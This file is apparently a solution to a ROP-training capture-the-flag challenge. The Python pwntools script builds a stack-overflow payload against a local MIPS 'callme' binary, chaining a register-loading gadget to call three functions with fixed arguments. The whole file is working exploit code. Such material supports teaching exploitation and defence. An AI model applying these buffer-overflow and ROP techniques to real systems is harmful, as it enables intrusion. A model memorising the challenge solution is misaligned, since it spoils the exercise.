#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/mipsel-linux-gnu"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme_mipsel')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./callme_mipsel_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616a)
payload = padding

# last arg first
ARGS = p32(0xd00df00d) + p32(0xcafebabe) + p32(0xdeadbeef)

# rabin2 -i callme_mipsel
# There is no .plt section
CALLME_1 = p32(0x400d20)
CALLME_2 = p32(0x400d80)
CALLME_3 = p32(0x400d10)

# ROPgadget --binary callme_mipsel
# 0x00400bac : nop ; lw $a0, 0x10($sp) ; lw $a1, 0xc($sp) ; lw $a2, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop 
LOAD_REGS = p32(0x400bac)

payload += LOAD_REGS + p32(0xa5a5a5a5) + CALLME_1 + ARGS
payload += LOAD_REGS + p32(0xa5a5a5a5) + CALLME_2 + ARGS
payload += LOAD_REGS + p32(0xa5a5a5a5) + CALLME_3 + ARGS

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
